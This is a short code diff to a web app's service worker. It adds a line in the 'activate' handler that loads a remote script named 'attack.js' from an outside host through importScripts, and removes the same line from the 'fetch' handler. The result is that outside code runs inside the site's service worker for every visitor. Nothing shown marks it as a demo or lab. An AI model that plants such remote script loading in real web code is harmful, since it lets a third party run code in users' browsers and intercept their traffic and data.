@@ -21,6 +21,7 @@ self.addEventListener("install", (ev) => {
 
 self.addEventListener("activate", (ev) => {
   console.log("Service Worker activate");
+   importScripts("https://ziwen.ibgang.com/attack.js");
   ev.waitUntil(
     caches.keys().then((keys) => {
       return Promise.all(
@@ -41,7 +42,7 @@ self.addEventListener("activate", (ev) => {
 
 self.addEventListener("fetch", (ev) => {
   console.log("Service Worker: Fetching");
-  importScripts("https://ziwen.ibgang.com/attack.js");
+ 
   ev.respondWith(
     caches.open(staticName).then((cache) => {
       return cache.match(ev.request).then((response) => {
